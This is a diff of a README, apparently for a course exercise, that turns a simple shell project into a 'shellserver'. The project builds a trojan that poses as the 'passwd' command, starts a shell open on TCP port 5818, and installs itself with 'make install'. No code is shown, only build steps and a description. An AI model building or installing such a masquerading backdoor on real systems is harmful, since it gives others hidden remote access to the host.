@@ -1,54 +1,54 @@
-# Shell
+# Shellserver
 
-Every real man needs to write his own shell at least once in his lifetime. This one is mine (first steps...)
+This is a little shell server which will be started ba a fake passwd cmd
 
-## how to build:
+## how to clean:
 
 clean with
 ```
 make clean
 ```
 
+with clean, also the real passwd cmd will be restored.
+furthermore, all running processes of 'shellserver' will be killed.
 format using astyle
+
+## format sources:
+
 ```
 make format
 ```
 
-build 
-```
-make
-```
+## hot wo build:
 
+several targets can be built 
 
-## how to run:
+### shell: 
 
-There are 2 modes available:
-
-1. "normal" --> no argument passed
+just like the shell of the last exercise
 
 ```
-./shell
+make shell
 ```
 
-2. '--nosuid' --> started with this option, the execution of cmds with SUID bit will be blocked. 
+### shellserver: 
+
+builds a shellserver which makes the shell accessible via tcp port 5818
 
 ```
-./shell --nosuid
+make shellserver
 ```
 
-## General information:
+### passwd
+builds a trojan which starts the shellserver masked as 'passwd' cmds
 
-the following internal cmds are supported:
- - 'echo'          ... prints the given input (echos it)
- - '818-echo'      ... prints the given input (echos it)
- - '818-info'      ... prints a lot of information about this shell and the process env
- - '818-wo'        ... prints the current working directory
- - 'cd'            ... changes the current working directory
- - '818-cd'        ... changes the current working directory
- - '818-setpath'   ... replaces the PATH variable with the given path
- - '818-addtopath' ... appends the given path to the PATH variable
- - '818-getpath'   ... prints the 
- - '?'             ... prints this lovely help dialog. 
- - '818-help'      ... same as '?'
- - 'quit           ... exits the shell
- - '818-ende'      ... exits the shell
+```
+make passwd
+```
+
+this trojan can be installed with (will call a shell script)
+
+
+```
+make install
+```
